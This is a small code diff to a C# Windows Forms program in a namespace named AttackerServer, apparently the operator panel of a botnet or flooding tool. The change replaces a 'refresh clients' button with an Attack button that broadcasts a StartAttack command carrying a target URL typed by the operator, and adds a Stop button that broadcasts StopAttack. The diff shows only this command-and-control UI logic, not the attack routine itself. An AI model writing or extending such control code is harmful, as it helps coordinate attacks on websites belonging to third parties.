@@ -192,11 +192,18 @@ namespace AttackerServer
             });
         }
 
-        private void BtnRefreshClients_Click(object sender, EventArgs e)
+        private void BtnAttack_Click(object sender, EventArgs e)
         {
-            PublishMessage(MessageType.RefreshClients, String.Empty, () =>
+            PublishMessage(MessageType.StartAttack, txtUrl.Text, () =>
             {
-                MessageBox.Show("Refreshed!");
+                return true;
+            });
+        }
+
+        private void BtnStop_Click(object sender, EventArgs e)
+        {
+            PublishMessage(MessageType.StopAttack, String.Empty, () =>
+            {
                 return true;
             });
         }
